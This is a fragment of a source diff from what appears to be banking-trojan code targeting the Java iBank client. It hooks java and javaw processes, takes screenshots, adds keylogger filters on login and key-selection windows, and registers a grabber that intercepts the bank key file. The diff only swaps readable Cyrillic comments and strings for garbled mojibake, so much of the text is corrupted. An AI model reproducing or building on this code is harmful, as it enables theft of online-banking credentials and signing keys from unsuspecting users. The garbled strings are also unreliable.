+	if( SExpWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite ) ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		if( lpNumberOfBytesWritten )
 			*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
@@ -594,18 +605,18 @@ BOOL WINAPI Hook_CloseHandle( HANDLE hObject )
 	void ___RegisterIBankSystem(DWORD hashApp)
 	{
 
-		// Тестовая регистрация
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 		ClearStruct(IBank::Log);
 		IBank::Hooked = false;
 		IBank::System = NULL;
 
-		// Функция регистрирует систему IBANK
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ IBANK
 		char SysName[]   = {'I', 'B', 'A', 'N', 'K',  0};
 		char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
-		char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
-		char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
-		char Caption3[]  = {'*','и','н','х','р','о','н','и','з','а','ц','и','я','*', 0}; //Синхронизация с банком
+		char Caption1[]  = {'*', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', '*',  0};;
+		char Caption2[]  = {'*', 'пїЅ', 'пїЅ', '*', 'пїЅ', '*',  0};
+		char Caption3[]  = {'*','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','*', 0}; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 
 
@@ -613,7 +624,7 @@ BOOL WINAPI Hook_CloseHandle( HANDLE hObject )
 
 		if (S != NULL)
 		{
-			IBDBG("IBank", "Система зарегистрирована");
+			IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			IBank::System = S;
 			S->OnActivate      = IBank::SystemActivated;
 			S->OnDeactivate    = IBank::SystemDeactivated;
@@ -622,7 +633,7 @@ BOOL WINAPI Hook_CloseHandle( HANDLE hObject )
 
 			IBank::MakeScreenShot();
 
-			// Добавляем фильтры окон
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			PKlgWndFilter F;
 			F = KeyLogger::AddFilter(S, true, true, NULL, Caption1, FILTRATE_PARENT_WND, LOG_ALL, 3);
 			if (F != NULL)
@@ -642,7 +653,7 @@ void RegisterIBankSystem(DWORD hashApp)
 {
 
 
-	// Для тестов
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //	#ifdef AGENTFULLTEST
 //		___RegisterIBankSystem(0);
 //		return;
@@ -659,16 +670,16 @@ void RegisterIBankSystem(DWORD hashApp)
 	#endif
 
 
-	// Функция регистрирует систему IBANK
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ IBANK
 
 	char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
 	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};
 	char ClassName2[] = {'S','u','n','A','w','t','D','i','a','l','o','g', 0};
 
-	char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
-	char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
-	char Caption3[]  = {'*','и','н','х','р','о','н','*','з','а','ц','*', 0}; //Синхронизация с банком
-	char Caption4[]	 = {'*','в','*','б','*','р','*','к','л','ю','ч','а', 0}; //выбор ключа
+	char Caption1[]  = {'*', 'пїЅ', 'пїЅ', 'пїЅ', 'пїЅ', '*',  0};;
+	char Caption2[]  = {'*', 'пїЅ', 'пїЅ', '*', 'пїЅ', '*',  0};
+	char Caption3[]  = {'*','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','*','пїЅ','пїЅ','пїЅ','*', 0}; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	char Caption4[]	 = {'*','пїЅ','*','пїЅ','*','пїЅ','*','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ', 0}; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 
 	DWORD hashMain = PROCESS_HASH_JAVA;
@@ -676,12 +687,12 @@ void RegisterIBankSystem(DWORD hashApp)
 
 	if( hashApp == PROCESS_HASH_JAVAW)
 	{
-		//если javaw.exe запущен не из под java.exe, то возможно это оффлайн версия ибанка
+		//пїЅпїЅпїЅпїЅ javaw.exe пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ java.exe, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD hashParent = GetHashForPid(GetParentPID());
 
 		#ifdef JAVS_PATCHERH
 			BOOL ParentIsJava = (hashParent == PROCESS_HASH_JAVA || 
-								hashParent == PROCESS_HASH_PATCHED_JAVA); // При работающем патчере запускается из под этого процесса
+								hashParent == PROCESS_HASH_PATCHED_JAVA); // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		#else
 			BOOL ParentIsJava = (hashParent == PROCESS_HASH_JAVA);
 		#endif
@@ -699,7 +710,7 @@ void RegisterIBankSystem(DWORD hashApp)
 
 		if( IBank::ProcessID == 0 ) IBank::ProcessID = GetUniquePID();
 
-		IBDBG("IBank", "Система зарегистрирована");
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		IBank::System = S;
 		S->OnActivate      = IBank::SystemActivated;
 		S->OnDeactivate    = IBank::SystemDeactivated;
@@ -708,7 +719,7 @@ void RegisterIBankSystem(DWORD hashApp)
 
 		IBank::MakeScreenShot(); 
 
-		// Добавляем фильтры окон
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		PKlgWndFilter F;
 		F = KeyLogger::AddFilter(S, true, true, ClassName, Caption1, FILTRATE_PARENT_WND, LOG_ALL, 3);
 		if (F != NULL)
@@ -724,18 +735,18 @@ void RegisterIBankSystem(DWORD hashApp)
 			S->OnDeactivate = IBank::SystemDeactivated;
 		}
 
-		if( hashMain == PROCESS_HASH_JAVAW ) //граббер ключей для оффлайн версии
+		if( hashMain == PROCESS_HASH_JAVAW ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			S->OnProcessRun = IBank::SystemActivated2;
 	}
 
 
-    // Регистрируем грабер для перехвата файла ключа
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if(hashMain != PROCESS_HASH_JAVAW)
 	{
 		S = KeyLogger::AddSystem(SysNameW, PROCESS_HASH_JAVAW);
 		if( S!= NULL )
 		{
-			IBDBG("IBankW", "Система зарегистрирована");
+			IBDBG("IBankW", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			IBank::System = S;
 			S->OnProcessRun = IBank::SystemActivatedW;
 		}
